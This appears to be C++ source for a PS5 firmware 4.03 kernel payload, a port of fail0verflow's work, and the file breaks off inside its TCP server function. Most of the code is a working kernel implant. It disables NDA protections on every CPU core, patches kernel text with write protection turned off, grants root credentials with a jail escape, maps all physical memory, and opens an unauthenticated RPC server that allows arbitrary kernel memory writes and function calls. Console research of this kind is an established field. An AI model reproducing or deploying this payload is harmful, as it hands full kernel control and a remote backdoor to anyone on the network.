/*
 * Kernel RPC payload for PS5 FW 4.03.
 *
 * Ported from fail0verflow's prosperous kpayload, adapted for FW 4.03
 * kernel symbol offsets and the existing kekcall infrastructure.
 *
 * This payload:
 *   1. Disables NDA (Non-Debug Area) enforcement on all CPU cores
 *   2. Elevates privileges (root UID, jail escape)
 *   3. Sets up a full DMAP mapping for physical memory access
 *   4. Starts a TCP RPC server on port 6670
 *
 * The RPC server provides:
 *   - Kernel memory read/write
 *   - Arbitrary kernel function calls
 *   - Physical-to-virtual translation
 *   - SMN register access
 *   - MP4 coprocessor access
 *   - Data Fabric register access
 *   - SBL service requests
 *   - File I/O via vnode operations
 *
 * Build:
 *   g++ -Wall -Wno-unused-function -Werror -pie -Os -g -masm=intel \
 *     -march=znver2 -fcf-protection=none -fno-exceptions -fno-rtti \
 *     -nostdlib -ffreestanding -static -ffunction-sections \
 *     -Wl,--gc-sections -Wl,--build-id=none \
 *     -o kpayload.elf kpayload.cpp -T kpayload.ld
 *   objcopy -O binary kpayload.elf kpayload
 *
 * Payload must fit within 16KB (0x4000 bytes) per the linker script.
 */

#include <atomic>
#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <utility>

using s8 = int8_t;
using s16 = int16_t;
using s32 = int32_t;
using s64 = int64_t;
using u8 = uint8_t;
using u16 = uint16_t;
using u32 = uint32_t;
using u64 = uint64_t;
using vu8 = volatile u8;
using vu16 = volatile u16;
using vu32 = volatile u32;
using vu64 = volatile u64;

constexpr size_t PAGE_SIZE = 0x4000;

template <typename T>
constexpr T align_down(T val, size_t align) {
    return val & ~(align - 1);
}

template <typename T>
constexpr T align_up(T val, size_t align) {
    return align_down(val + align - 1, align);
}

#define PACKED __attribute__((packed))

#define OSTRUCT_PAD(size) u8 CAT(_pad_, __COUNTER__)[size]
#define CAT_(x, y) x##y
#define CAT(x, y) CAT_(x, y)
#define OSTRUCT_S(name) struct name { union {
#define OSTRUCT_E(name, size) OSTRUCT_PAD(size); }; }; \
    static_assert(sizeof(name) == (size), "size of " #name " != " #size)
#define OSTRUCT_F(offset, field) struct { OSTRUCT_PAD(offset); field; }

using sbintime_t = s64;
using vm_offset_t = u64;
using vm_size_t = u64;
using vm_paddr_t = u64;
using vm_prot_t = u16;
using u_long = u64;
using uid_t = u32;
using gid_t = u32;
using lwpid_t = s32;
using cpuset_t = u64;

/* FreeBSD kernel structure definitions */
struct lock_object {
    const char* lo_name;
    u32 lo_flags;
    u32 lo_data;
    struct witness* lo_witness;
};

struct mtx {
    struct lock_object lock_object;
    volatile uintptr_t mtx_lock;
};

template <typename T>
struct ListEntry {
    T* next;
    T** prev;
};

struct malloc_type_internal { u8 _pad[0x40]; };
OSTRUCT_S(malloc_type)
OSTRUCT_F(8 * 3, void* ks_handle);
OSTRUCT_E(malloc_type, 8 * 4);

OSTRUCT_S(pmap)
OSTRUCT_F(0x20, u64* pm_pml4);
OSTRUCT_F(0x28, u64 pm_cr3);
OSTRUCT_E(pmap, 0x288);
using pmap_t = pmap*;

OSTRUCT_S(vmspace)
OSTRUCT_F(0x2e0, struct pmap vm_pmap);
OSTRUCT_E(vmspace, 0x568);

OSTRUCT_S(sce_ucred)
OSTRUCT_F(0x00, u64 field_0);
OSTRUCT_F(0x08, u64 field_8);
OSTRUCT_E(sce_ucred, 0x90);

OSTRUCT_S(ucred)
OSTRUCT_F(0x04, uid_t cr_uid);
OSTRUCT_F(0x08, uid_t cr_ruid);
OSTRUCT_F(0x0c, uid_t cr_svuid);
OSTRUCT_F(0x10, int cr_ngroups);
OSTRUCT_F(0x14, gid_t cr_rgid);
OSTRUCT_F(0x18, gid_t cr_svgid);
OSTRUCT_F(0x58, sce_ucred sce);
OSTRUCT_F(0x118, gid_t* cr_groups);
OSTRUCT_E(ucred, 0x168);

OSTRUCT_S(filedesc)
OSTRUCT_F(0x10, struct vnode* fd_rdir);
OSTRUCT_F(0x18, struct vnode* fd_jdir);
OSTRUCT_E(filedesc, 0x78);

OSTRUCT_S(proc)
OSTRUCT_F(0, ListEntry<proc> p_list);
OSTRUCT_F(0x40, ucred* p_ucred);
OSTRUCT_F(0x48, filedesc* p_fd);
OSTRUCT_F(0xbc, u32 p_pid);
OSTRUCT_F(0x200, vmspace* p_vmspace);
OSTRUCT_F(0x590, u32 sdk_ver_ppr);
OSTRUCT_F(0xc39, u8 is_ppr);
OSTRUCT_F(0xc84, u32 sdk_ver_ppr_minor);
OSTRUCT_E(proc, 0xC88);

OSTRUCT_S(thread)
OSTRUCT_F(8, proc* td_proc);
OSTRUCT_F(0x9c, u32 td_tid);
OSTRUCT_F(0x13c, int td_pinned);
OSTRUCT_F(0x140, ucred* td_ucred);
OSTRUCT_E(thread, 0x670);

struct iovec {
    void* iov_base;
    size_t iov_len;
};

enum uio_rw { UIO_READ, UIO_WRITE };
enum uio_seg { UIO_USERSPACE, UIO_SYSSPACE, UIO_NOCOPY };

struct uio {
    struct iovec* uio_iov;
    int uio_iovcnt;
    off_t uio_offset;
    ssize_t uio_resid;
    enum uio_seg uio_segflg;
    enum uio_rw uio_rw;
    struct thread* uio_td;
};

struct SblMsgHeader {
    u32 cmd;
    u16 send_len;
    u16 resp_len;
    u64 mid;
    union { u32 subcmd; s32 status; u64 handle; };
};

/* CPU primitives */
static inline thread* curthread() {
    thread* td;
    asm volatile("mov %0, qword ptr gs:0" : "=r"(td));
    return td;
}

static inline u32 cur_cpuid() {
    u32 cpuid;
    asm volatile("mov %0, dword ptr gs:0x34" : "=r"(cpuid));
    return cpuid;
}

static const u64 CR0_WP = 1 << 16;

static inline u64 cr0_read() { u64 r; asm volatile("mov %0, cr0" : "=r"(r)); return r; }
static inline void cr0_write(u64 v) { asm volatile("mov cr0, %0" :: "r"(v)); }

static inline u64 write_protect_disable() {
    u64 cr0 = cr0_read();
    cr0_write(cr0 & ~CR0_WP);
    return cr0;
}
static inline void write_protect_restore(u64 cr0) {
    cr0_write(cr0_read() | (cr0 & CR0_WP));
}

static inline void wbinvd() { asm("wbinvd"); }

static inline void msr_write(u32 msr, u64 val) {
    u32 hi = val >> 32, lo = val;
    asm volatile("wrmsr" : : "c"(msr), "d"(hi), "a"(lo));
}

static inline u64 msr_read(u32 msr) {
    u32 hi, lo;
    asm volatile("rdmsr" : "=d"(hi), "=a"(lo) : "c"(msr));
    return ((u64)hi << 32) | lo;
}

static const u32 MSR_EFER = 0xC0000080;
static const u64 EFER_NDA = 1 << 16;

static inline void nda_disable() {
    msr_write(MSR_EFER, msr_read(MSR_EFER) & ~EFER_NDA);
}

static inline bool nda_enabled() {
    return (msr_read(MSR_EFER) & EFER_NDA) != 0;
}

size_t strlen(const char* s) { const char* e = s; while (*e++) ; return e - s - 1; }

struct ShitLock {
    enum LockFlag : u32 { kFree, kUsed };
    void lock() {
        LockFlag expected{kFree}, new_val{kUsed};
        while (!__atomic_compare_exchange(&flag, &expected, &new_val, false,
                                          __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST))
            expected = kFree;
    }
    void unlock() {
        LockFlag new_val{kFree};
        __atomic_store(&flag, &new_val, __ATOMIC_SEQ_CST);
    }
    LockFlag flag{kFree};
};

#define RELOC(func, rva) .func = decltype(Syms::func)(rva)
#define RELOC_DEREF(r) r = *(decltype(r)*)r;

struct Syms {
    bool reloc(uintptr_t base) {
        if (initialized) return true;
        kernel_base = base;
        auto start = (uintptr_t*)&copyin;
        auto end = (uintptr_t*)&initialized;
        for (auto p = start; p < end; p++) {
            if (!*p) return false;
            *p += kernel_base;
        }
        RELOC_DEREF(kernel_arena);
        RELOC_DEREF(kmem_arena);
        initialized = true;
        return true;
    }

    int (*copyin)(const void* udaddr, void* kaddr, size_t len);
    int (*copyout)(const void* kaddr, void* udaddr, size_t len);
    vm_offset_t (*kmem_alloc_contig)(struct vmem*, vm_size_t, int, vm_paddr_t, vm_paddr_t, u_long, vm_paddr_t, char);
    vm_offset_t (*kmem_malloc)(struct vmem*, vm_size_t, int);
    void (*kmem_free)(struct vmem*, vm_offset_t, vm_size_t);
    vm_paddr_t (*pmap_kextract)(vm_offset_t);
    void (*pmap_protect)(pmap_t, vm_offset_t, vm_offset_t, vm_prot_t);
    int (*kthread_add)(void (*)(void*), void*, struct proc*, struct thread**, int, int, const char*, ...);
    void (*kthread_exit)(void);
    int (*soaccept)(struct socket*, struct sockaddr**);
    int (*sobind)(struct socket*, struct sockaddr*, struct thread*);
    int (*soclose)(struct socket*);
    int (*socreate)(int, struct socket**, int, int, struct ucred*, struct thread*);
    int (*solisten)(struct socket*, int, struct thread*);
    int (*soreceive)(struct socket*, struct sockaddr**, struct uio*, struct mbuf**, struct mbuf**, int*);
    int (*sosend)(struct socket*, struct sockaddr*, struct uio*, struct mbuf*, struct mbuf*, int, struct thread*);
    int (*sosetopt)(struct socket*, struct sockopt*);
    void (*putchar)(int, void*);
    void (*msgbuf_addstr)(struct msgbuf*, int, char*, int);
    int (*printf)(const char*, ...);
    void (*smp_rendezvous)(void (*)(void*), void (*)(void*), void (*)(void*), void*);
    int (*_sleep)(void*, struct lock_object*, int, const char*, sbintime_t, sbintime_t, int);
    void (*__mtx_lock_flags)(volatile uintptr_t*, int, const char*, int);
    void (*__mtx_unlock_flags)(volatile uintptr_t*, int, const char*, int);
    void* (*_malloc)(unsigned long, struct malloc_type*, int);
    void (*_free)(void*, struct malloc_type*);
    int (*sblServiceRequest)(void*, void*, void*, int);
    int (*ioMsgHandler)(u32, SblMsgHeader*, void*);
    int (*handleDefault)(u32, SblMsgHeader*, void*);
    void (*NDINIT_ALL)(struct nameidata*, u_long, u_long, enum uio_seg, const char*, int, struct vnode*, void*, struct thread*);
    void (*NDFREE)(struct nameidata*, u32);
    int (*vn_open)(struct nameidata*, int*, int, struct file*);
    int (*vn_close)(struct vnode*, int, struct ucred*, struct thread*);
    int (*vn_rdwr)(enum uio_rw, struct vnode*, void*, int, off_t, enum uio_seg, int, struct ucred*, struct ucred*, ssize_t*, struct thread*);

    vmem* kernel_arena;
    vmem* kmem_arena;
    u8* ktext_slack;
    u8* bootparams;
    pmap_t kernel_pmap;
    u8* mdbg_trap_early;
    u8* sysveri_notif_sent;
    struct mtx* accept_mtx;
    u32* dmap_indices;

    bool initialized;

    void mtx_lock(struct mtx* m) { __mtx_lock_flags(&m->mtx_lock, 0, nullptr, 0); }
    void mtx_unlock(struct mtx* m) { __mtx_unlock_flags(&m->mtx_lock, 0, nullptr, 0); }

    malloc_type_internal fake_mti;
    malloc_type fake_mt;
    void malloc_type_init() { fake_mt.ks_handle = &fake_mti; }
    void* malloc(size_t len) { malloc_type_init(); return _malloc(len, &fake_mt, 0x102); }
    void free(void* addr) { malloc_type_init(); _free(addr, &fake_mt); }

    template <typename T>
    T* pa_to_dmap(uintptr_t pa) {
        auto pml4ei = (uintptr_t)dmap_indices[0];
        auto pdpei = (uintptr_t)dmap_indices[1];
        return (T*)(0xFFFF800000000000ull | (pml4ei << 39) | (pdpei << 30) | pa);
    }

    vu64 debug;
    u64 sdk_ver_ppr;
    uintptr_t kernel_base;
    u32 host_ip_addr;
    ShitLock uart_lock;
};

/*
 * FW 4.03 kernel symbol offsets.
 * These are RVAs from kernel .text base.
 */
static Syms sym_4_03 = {
    RELOC(copyin,              0x2DFEB0),
    RELOC(copyout,             0x2DFE00),
    RELOC(kmem_alloc_contig,   0x4E9A30),
    RELOC(kmem_malloc,         0x4E9E70),
    RELOC(kmem_free,           0x4EA0F0),
    RELOC(pmap_kextract,       0x846CB0),
    RELOC(pmap_protect,        0x849F00),
    RELOC(kthread_add,         0x88F7F0),
    RELOC(kthread_exit,        0x88FAC0),
    RELOC(soaccept,            0x4DFC00),
    RELOC(sobind,              0x4DF4C0),
    RELOC(soclose,             0x4DF660),
    RELOC(socreate,            0x4DE3A0),
    RELOC(solisten,            0x4DF5B0),
    RELOC(soreceive,           0x4E2910),
    RELOC(sosend,              0x4E0B10),
    RELOC(sosetopt,            0x4E2C80),
    RELOC(putchar,             0x490480),
    RELOC(msgbuf_addstr,       0xB62370),
    RELOC(printf,              0x4909A0),
    RELOC(smp_rendezvous,      0xA54060),
    RELOC(_sleep,              0xB38CC0),
    RELOC(__mtx_lock_flags,    0x4A4450),
    RELOC(__mtx_unlock_flags,  0x4A4950),
    RELOC(_malloc,             0xB3B560),
    RELOC(_free,               0xB3B770),
    RELOC(sblServiceRequest,   0x721A50),
    RELOC(ioMsgHandler,        0x507090),
    RELOC(handleDefault,       0x722080),
    RELOC(NDINIT_ALL,          0x5A1980),
    RELOC(NDFREE,              0x5A1A00),
    RELOC(vn_open,             0x635AE0),
    RELOC(vn_close,            0x636680),
    RELOC(vn_rdwr,             0x636880),
    RELOC(kernel_arena,        0x18A1E30),
    RELOC(kmem_arena,          0x18A1E38),
    RELOC(ktext_slack,         0xBCBBC8),
    RELOC(bootparams,          0x7041D40),
    RELOC(kernel_pmap,         0x3D94218),
    RELOC(mdbg_trap_early,     0x757A60),
    RELOC(sysveri_notif_sent,  0x31D7C48),
    RELOC(accept_mtx,          0x3332870),
    RELOC(dmap_indices,        0x3D944A0),
};
static Syms& sym = sym_4_03;

extern char payload_early_start[];
extern char payload_early_end[];
extern char payload_start[];
extern char payload_end[];

static constexpr size_t get_payload_size() { return payload_end - payload_start; }

template <typename T>
static constexpr T reloc_addr(uintptr_t base, T addr) {
    return (T)(base + ((uintptr_t)addr - (uintptr_t)payload_start));
}

static inline void sched_pin() {
    curthread()->td_pinned++;
    std::atomic_signal_fence(std::memory_order_seq_cst);
}

static inline void sched_unpin() {
    std::atomic_signal_fence(std::memory_order_seq_cst);
    curthread()->td_pinned--;
}

struct SchedPin {
    SchedPin() { sched_pin(); }
    ~SchedPin() { sched_unpin(); }
};

template <typename T>
static void modify_code(T callback) {
    SchedPin pin;
    auto wp = write_protect_disable();
    callback();
    wbinvd();
    write_protect_restore(wp);
}

struct nda_disable_stats {
    std::atomic<u32> tried;
    std::atomic<u32> failed;
};

static void nda_disable_worker(void* arg) {
    nda_disable();
    auto stats = (nda_disable_stats*)arg;
    stats->tried++;
    stats->failed += nda_enabled();
}

static bool nda_disable_all() {
    modify_code([] {
        memcpy((void*)sym.ktext_slack, payload_early_start,
               payload_early_end - payload_early_start);
    });

    auto nda_disabler = (void(*)(void*))((uintptr_t)sym.ktext_slack +
        ((uintptr_t)nda_disable_worker - (uintptr_t)payload_early_start));

    bool done = false;
    for (u32 i = 0; i < 10 && !done; i++) {
        nda_disable_stats stats{};
        sym.smp_rendezvous(nullptr, nda_disabler, nullptr, &stats);
        if (stats.failed.load() == 0) {
            done = true;
            break;
        }
    }

    modify_code([] {
        memset((void*)sym.ktext_slack, 0x90,
               payload_early_end - payload_early_start);
    });
    return done;
}

/* Setup full DMAP at 0xFFFFFFE000000000 */
static void setup_full_dmap(int enable) {
    auto pml4 = curthread()->td_proc->p_vmspace->vm_pmap.pm_pml4;
    uintptr_t base = 0xffffffe000000000;
    auto pml4e = pml4[(base >> 39) & 0x1ff];
    auto pdp = sym.pa_to_dmap<u64>(pml4e & 0x000ffffffffff000);
    auto pdpe = &pdp[(base >> 30) & 0x1ff];
    for (u32 i = 0; i < 18; i++) {
        pdpe[i] = enable ? ((0x40000000ull * i) | 0x9f) : 0;
    }
}

struct DmapPin {
    DmapPin() { setup_full_dmap(1); }
    ~DmapPin() { setup_full_dmap(0); }
};

static void ucred_set_root(ucred* cr) {
    cr->cr_uid = cr->cr_ruid = cr->cr_svuid = 0;
    cr->cr_rgid = cr->cr_svgid = 0;
    cr->cr_ngroups = 1;
    cr->cr_groups[0] = 0;
    cr->sce.field_0 = 0x480000000000001eull;
    cr->sce.field_8 = 0x40001c0000000000ull;

    auto p = curthread()->td_proc->p_list.next;
    while (p) {
        if (p->p_pid == 0) {
            auto fd = curthread()->td_proc->p_fd;
            fd->fd_rdir = p->p_fd->fd_rdir;
            fd->fd_jdir = nullptr;
            break;
        }
        p = p->p_list.next;
    }
}

/* TCP server types */
using sa_family_t = u8;
using in_port_t = u16;
using in_addr_t = u32;

#define AF_INET 2
#define SOCK_STREAM 1
#define SOCK_DGRAM 2
#define MSG_WAITALL 0x40
#define MSG_DONTWAIT 0x80
#define SOL_SOCKET 0xffff
#define SO_REUSEADDR 0x0004
#define IPPROTO_TCP 6

struct in_addr { in_addr_t s_addr; };
struct sockaddr_in {
    u8 sin_len; sa_family_t sin_family; in_port_t sin_port;
    struct in_addr sin_addr; char sin_zero[8];
};

constexpr u16 htons(u16 v) { return (v >> 8) | (v << 8); }
constexpr u32 ipv4_addr_n(u8 a, u8 b, u8 c, u8 d) {
    return (d << 24) | (c << 16) | (b << 8) | a;
}

constexpr sockaddr_in sockaddr_ipv4(u32 addr, u16 port) {
    return { .sin_len = sizeof(sockaddr_in), .sin_family = AF_INET,
             .sin_port = htons(port), .sin_addr = { .s_addr = addr } };
}

#define SS_NBIO 0x0100
#define SBS_CANTRCVMORE 0x0020

OSTRUCT_S(sockbuf)
OSTRUCT_F(0x50, struct mtx sb_mtx);
OSTRUCT_F(0x90, short sb_state);
OSTRUCT_E(sockbuf, 0x148);

OSTRUCT_S(socket)
OSTRUCT_F(0, int so_count);
OSTRUCT_F(0x10, u32 so_state);
OSTRUCT_F(0x14, int so_qstate);
OSTRUCT_F(0x30, socket* so_head);
OSTRUCT_F(0x68, u32 so_qlen);
OSTRUCT_F(0x74, short so_timeo);
OSTRUCT_F(0x76, u64 so_error);
OSTRUCT_F(0x88, sockbuf so_rcv);
OSTRUCT_E(socket, 0x548);

struct Uio {
    struct uio* setup_read(void* buf, size_t len) {
        iov.iov_base = buf; iov.iov_len = len;
        uio_.uio_iov = &iov; uio_.uio_iovcnt = 1;
        uio_.uio_offset = 0; uio_.uio_resid = len;
        uio_.uio_segflg = UIO_SYSSPACE; uio_.uio_rw = UIO_READ;
        uio_.uio_td = curthread();
        return &uio_;
    }
    struct uio* setup_write(const void* buf, size_t len) {
        iov.iov_base = const_cast<void*>(buf); iov.iov_len = len;
        uio_.uio_iov = &iov; uio_.uio_iovcnt = 1;
        uio_.uio_offset = 0; uio_.uio_resid = len;
        uio_.uio_segflg = UIO_SYSSPACE; uio_.uio_rw = UIO_WRITE;
        uio_.uio_td = curthread();
        return &uio_;
    }
    struct iovec iov{};
    struct uio uio_{};
};

struct Socket {
    ~Socket() { close(); }
    bool create(int type = SOCK_STREAM) {
        auto td = curthread();
        return sym.socreate(AF_INET, &s, type, 0, td->td_ucred, td) == 0;
    }
    bool close() {
        if (!s) return true;
        int err = sym.soclose(s); s = nullptr;
        return err == 0;
    }
    template <typename T>
    bool setopt(int level, int name, const T& val) {
        struct sockopt sopt = { .sopt_dir = SOPT_SET, .sopt_level = level,
            .sopt_name = name, .sopt_val = (void*)&val, .sopt_valsize = sizeof(T) };
        return sym.sosetopt(s, &sopt) == 0;
    }
    bool bind(const sockaddr_in& addr) {
        return sym.sobind(s, (sockaddr*)&addr, curthread()) == 0;
    }
    bool listen(int backlog = 1) {
        return sym.solisten(s, backlog, curthread()) == 0;
    }
    bool accept(Socket* so) {
        sockaddr* addr{};
        /* Simplified accept - poll-based */
        int err = sym.soaccept(so->s, &addr);
        sym.free(addr);
        return err == 0;
    }
    bool read(void* buf, size_t len) {
        Uio uio;
        int flags = MSG_WAITALL;
        int err = sym.soreceive(s, nullptr, uio.setup_read(buf, len),
                                nullptr, nullptr, &flags);
        return err == 0 && !(s->so_rcv.sb_state & SBS_CANTRCVMORE);
    }
    bool write(const void* buf, size_t len) {
        Uio uio;
        int flags = 0;
        return sym.sosend(s, nullptr, uio.setup_write(buf, len),
                         nullptr, nullptr, flags, curthread()) == 0;
    }
    template <typename T> bool read(T* obj) { return read(obj, sizeof(*obj)); }
    template <typename T> bool write(const T& obj) { return write(&obj, sizeof(T)); }

    enum sopt_dir { SOPT_GET, SOPT_SET };
    struct sockopt {
        enum sopt_dir sopt_dir; int sopt_level; int sopt_name;
        void* sopt_val; size_t sopt_valsize; struct thread* sopt_td;
    };

    socket* s{};
};

/* Hardware access helpers */
struct SmnAccess {
    u32 read32(u32 addr) { *ind_index = addr; return *ind_data; }
    void write32(u32 addr, u32 val) { *ind_index = addr; *ind_data = val; }
    vu32* ind_index;
    vu32* ind_data;
    SmnAccess() {
        auto base = sym.pa_to_dmap<u32>(0xF0000000 + 0xA0);
        ind_index = (vu32*)base;
        ind_data = (vu32*)(base + 1);
    }
};

struct Mp4Access {
    Mp4Access() {
        for (int i = 0; i < 5; i++)
            c2p[i] = sym.pa_to_dmap<u32>(0xE0400000 + 0xF6000 + i * 0x1000);
    }
    bool send_cmd(u32 cmd, u32 a1 = 0, u32 a2 = 0, u32 a3 = 0, u32 a4 = 0) {
        *c2p[1] = a1; *c2p[2] = a2; *c2p[3] = a3; *c2p[4] = a4;
        std::atomic_thread_fence(std::memory_order_seq_cst);
        *c2p[0] = cmd;
        for (u32 i = 0; i < 0x10000; i++)
            if (*c2p[0] == 0) return true;
        return false;
    }
    u32 read32(u64 addr) {
        send_cmd(0x20400000, (u32)addr, (u32)(addr >> 32), 2);
        return *c2p[1];
    }
    void write32(u64 addr, u32 val) {
        send_cmd(0x20400003, (u32)addr, (u32)(addr >> 32), val);
    }
    vu32* c2p[5];
};

struct DfAccess {
    DfAccess() {
        auto base = sym.pa_to_dmap<u32>(0xF0000000 | (0x18 << 15) | (4 << 12));
        ficaa = (vu32*)(base + 0x50/4 + 2);
        ficad = (vu32*)(base + 0x80/4 + 4);
    }
    u32 read32(u32 inst, u32 func, u32 off) {
        *ficaa = ((inst & 0xff) << 16) | ((func & 7) << 11) | (off & ~3) | 1;
        return *ficad;
    }
    void write32(u32 inst, u32 func, u32 off, u32 val) {
        *ficaa = ((inst & 0xff) << 16) | ((func & 7) << 11) | (off & ~3) | 1;
        *ficad = val;
    }
    vu32 *ficaa, *ficad;
};

template <typename T>
struct ScopedMalloc {
    ScopedMalloc(size_t len) { ptr = (T*)sym.malloc(len); }
    ~ScopedMalloc() { sym.free(ptr); ptr = nullptr; }
    operator bool() { return ptr != nullptr; }
    T* get() { return ptr; }
    T* ptr;
};

uintptr_t call_rva(uintptr_t rva) {
    return ((uintptr_t(*)())(sym.kernel_base + rva))();
}

template <typename T, size_t N, size_t... Idx>
uintptr_t call_rva(uintptr_t rva, T (&arg)[N], std::index_sequence<Idx...>) {
    return ((uintptr_t(*)(T...))(sym.kernel_base + rva))(arg[Idx]...);
}

/* RPC command dispatch */
struct RpcClient {
    enum AllocMode : u64 { kNormal, kContig };
    RpcClient(Socket& s) : sock{s} {}

    bool cmd_ping() { return sock.write("pong", 5); }

    bool cmd_malloc() {
        struct { AllocMode mode; u64 size; } PACKED req{};
        struct { void* addr; } PACKED resp{};
        if (!sock.read(&req)) return false;
        if (req.mode == kContig)
            resp.addr = (void*)sym.kmem_alloc_contig(sym.kmem_arena, req.size, 0x102, 0, 0x480000000, PAGE_SIZE, 0, 6);
        else
            resp.addr = sym.malloc(req.size);
        return sock.write(resp);
    }

    bool cmd_free() {
        struct { AllocMode mode; void* addr; u64 size; } PACKED req{};
        if (!sock.read(&req)) return false;
        if (req.mode == kContig) sym.kmem_free(sym.kmem_arena, (vm_offset_t)req.addr, req.size);
        else sym.free(req.addr);
        return true;
    }

    bool cmd_call() {
        struct { uintptr_t rva; uintptr_t num_args; uintptr_t args[10]; } req{};
        struct { uintptr_t rv; } PACKED resp{};
        if (!sock.read(&req)) return false;
        switch (req.num_args) {
        case 0: resp.rv = call_rva(req.rva); break;
#define INVOKE(n) case n: resp.rv = call_rva(req.rva, req.args, std::make_index_sequence<n>{}); break;
        INVOKE(1); INVOKE(2); INVOKE(3); INVOKE(4); INVOKE(5);
        INVOKE(6); INVOKE(7); INVOKE(8); INVOKE(9); INVOKE(10);
#undef INVOKE
        default: resp.rv = 0xdeadc0ded06ba115; break;
        }
        return sock.write(resp);
    }

    bool cmd_mem_read() {
        struct { void* addr; size_t len; } PACKED req{};
        DmapPin pin;
        if (!sock.read(&req)) return false;
        return sock.write(req.addr, req.len);
    }

    bool cmd_mem_write() {
        struct { void* addr; size_t len; } PACKED req{};
        DmapPin pin;
        if (!sock.read(&req)) return false;
        return sock.read(req.addr, req.len);
    }

    bool cmd_runtime_info() {
        struct { u64 sdk_ver; uintptr_t kbase; void* sym_addr; size_t sym_size; } PACKED resp{
            sym.sdk_ver_ppr, sym.kernel_base, &sym, sizeof(sym) };
        return sock.write(resp);
    }

    bool cmd_vtophys() {
        struct { vm_offset_t va; } PACKED req{};
        struct { vm_paddr_t pa; } PACKED resp{};
        if (!sock.read(&req)) return false;
        resp.pa = sym.pmap_kextract(req.va);
        return sock.write(resp);
    }

    bool cmd_smn_read() {
        struct { u32 addr; u32 count; u32 increment; } PACKED req{};
        struct { u32 status; } PACKED resp{ .status = 0x1337dead };
        if (!sock.read(&req)) return false;
        auto buf = ScopedMalloc<u32>(req.count * 4);
        if (!buf) { sock.write(resp); return true; }
        SmnAccess smn;
        for (u32 s = 0, d = 0; d < req.count; d++, s += req.increment)
            buf.get()[d] = smn.read32(req.addr + s);
        resp.status = 0;
        if (!sock.write(resp)) return false;
        return sock.write(buf.get(), req.count * 4);
    }

    bool cmd_smn_write() {
        struct { u32 addr; u32 count; u32 increment; } PACKED req{};
        struct { u32 status; } PACKED resp{ .status = 0x1337dead };
        if (!sock.read(&req)) return false;
        auto buf = ScopedMalloc<u32>(req.count * 4);
        if (!buf) { sock.write(resp); return true; }
        if (!sock.read(buf.get(), req.count * 4)) return false;
        SmnAccess smn;
        for (u32 s = 0, d = 0; s < req.count; s++, d += req.increment)
            smn.write32(req.addr + d, buf.get()[s]);
        resp.status = 0;
        return sock.write(resp);
    }

    bool cmd_mp4_read() {
        struct { u32 addr; u32 count; u32 increment; } PACKED req{};
        struct { u32 status; } PACKED resp{ .status = 0x1337dead };
        if (!sock.read(&req)) return false;
        auto buf = ScopedMalloc<u32>(req.count * 4);
        if (!buf) { sock.write(resp); return true; }
        Mp4Access mp4;
        for (u32 s = 0, d = 0; d < req.count; d++, s += req.increment)
            buf.get()[d] = mp4.read32(req.addr + s);
        resp.status = 0;
        if (!sock.write(resp)) return false;
        return sock.write(buf.get(), req.count * 4);
    }

    bool cmd_mp4_write() {
        struct { u32 addr; u32 count; u32 increment; } PACKED req{};
        struct { u32 status; } PACKED resp{ .status = 0x1337dead };
        if (!sock.read(&req)) return false;
        auto buf = ScopedMalloc<u32>(req.count * 4);
        if (!buf) { sock.write(resp); return true; }
        if (!sock.read(buf.get(), req.count * 4)) return false;
        Mp4Access mp4;
        for (u32 s = 0, d = 0; s < req.count; s++, d += req.increment)
            mp4.write32(req.addr + d, buf.get()[s]);
        resp.status = 0;
        return sock.write(resp);
    }

    bool cmd_df_access() {
        struct { u32 rw; u32 inst; u32 func; u32 off; u32 val; } PACKED req{};
        struct { u32 val; } PACKED resp{};
        if (!sock.read(&req)) return false;
        DfAccess df;
        if (req.rw == 0) resp.val = df.read32(req.inst, req.func, req.off);
        else if (req.rw == 1) df.write32(req.inst, req.func, req.off, req.val);
        else resp.val = 0x1337dead;
        return sock.write(resp);
    }

    bool cmd_sbl_svc_req() {
        struct { SblMsgHeader hdr; int poll; } PACKED req{};
        struct { int rv; } PACKED resp{ .rv = 0x1337dead };
        if (!sock.read(&req)) return false;
        auto max_len = req.hdr.send_len > req.hdr.resp_len ? req.hdr.send_len : req.hdr.resp_len;
        if (!max_len) { sock.write(resp); return true; }
        auto buf = ScopedMalloc<u8>(max_len);
        if (!buf) { sock.write(resp); return true; }
        if (req.hdr.send_len && !sock.read(buf.get(), req.hdr.send_len)) return false;
        resp.rv = sym.sblServiceRequest(&req.hdr, buf.get(), buf.get(), req.poll);
        if (!sock.write(resp)) return false;
        if (!sock.write(req.hdr.resp_len)) return false;
        if (req.hdr.resp_len && !sock.write(buf.get(), req.hdr.resp_len)) return false;
        return true;
    }

    bool run() {
        bool ok = true;
        while (ok) {
            u32 cmd;
            if (!sock.read(&cmd)) break;
            switch (cmd) {
            case 0: return true;
            case 1: ok = cmd_ping(); break;
            case 2: ok = cmd_malloc(); break;
            case 3: ok = cmd_free(); break;
            case 4: ok = cmd_call(); break;
            case 5: ok = cmd_mem_read(); break;
            case 6: ok = cmd_mem_write(); break;
            case 7: ok = cmd_runtime_info(); break;
            case 8: ok = cmd_vtophys(); break;
            case 9: ok = cmd_sbl_svc_req(); break;
            case 10: ok = cmd_smn_read(); break;
            case 11: ok = cmd_smn_write(); break;
            case 12: ok = cmd_mp4_read(); break;
            case 13: ok = cmd_mp4_write(); break;
            case 14: ok = cmd_df_access(); break;
            default: ok = false; break;
            }
        }
        return false;
    }

    Socket& sock;
};

/* UART logging */
OSTRUCT_S(SalinaUartRegs)
OSTRUCT_F(0x00, vu8 rbr_thr);
OSTRUCT_F(0x14, vu8 lsr);
OSTRUCT_E(SalinaUartRegs, 0x100);

static void uart_write(const void* buf, size_t len) {
    auto uart = sym.pa_to_dmap<SalinaUartRegs>(0x85400000 + 0x26000);
    auto b = (const u8*)buf;
    std::lock_guard<ShitLock> lock(sym.uart_lock);
    while (len--) {
        while ((uart->lsr & 0x20) == 0) {}
        uart->rbr_thr = *b++;
    }
}

static void log(const char* msg) { uart_write(msg, strlen(msg)); }

/* TCP server thread */
static bool tcp_server() {
    Socket server;
    if (!server.create()) return false;
    int one = 1;
    server.setopt(SOL_SOCKET, SO_REUSEADDR, one);
    if (!server.bind(sockaddr_ipv4(0, 6670))) return false;
    if (!server.listen()) return false;

    sym.printf("%s\n", "prosperous RPC server started on port 6670");

    bool exiting = false;
    while (!exiting) {
        Socket client;
        sockaddr* addr{};
        if (sym.soaccept(server.s, &addr) != 0) return false;
        if (addr) sym.free(addr);
        /* Simplified: use server socket for first connection */
